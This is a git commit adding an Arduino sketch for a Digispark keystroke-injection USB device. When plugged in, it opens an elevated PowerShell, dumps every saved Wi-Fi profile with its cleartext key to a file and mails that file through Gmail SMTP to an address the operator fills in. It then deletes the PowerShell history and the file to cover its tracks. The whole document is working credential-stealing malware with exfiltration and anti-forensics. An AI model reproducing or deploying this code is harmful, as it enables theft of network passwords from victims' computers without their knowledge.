4945bfd0843e449edc166a952539c1e671a648f4
Esix <45178189+esixarmy@users.noreply.github.com>
2018-11-19 18:33:20 +0100

    Add files via upload

---
+++ wifi_pass_mailer_ESIX.ino
@@ -0,0 +1,46 @@
+#include "KeyboardES.h"
+void setup() {
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_A);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print(F("(netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Out-File wifi.txt; exit"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_A);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('TUA EMAIL', 'TUA PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'TUA EMAIL'; $ReportEmail.To.Add('EMAIL DOVE VUOI RICEVERE LE PASSWORD'); $ReportEmail.Subject = 'Ciao da esix :)'; $ReportEmail.Body = 'File con le password in allegato. -  Il tuo amichevole esix di quartiere. '; $ReportEmail.Attachments.Add('wifi.txt'); $SMTPInfo.Send($ReportEmail); exit"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_A);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath;exit"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print(F("del wifi.txt"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print(F("exit"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for(;;){ /*empty*/ }
+}
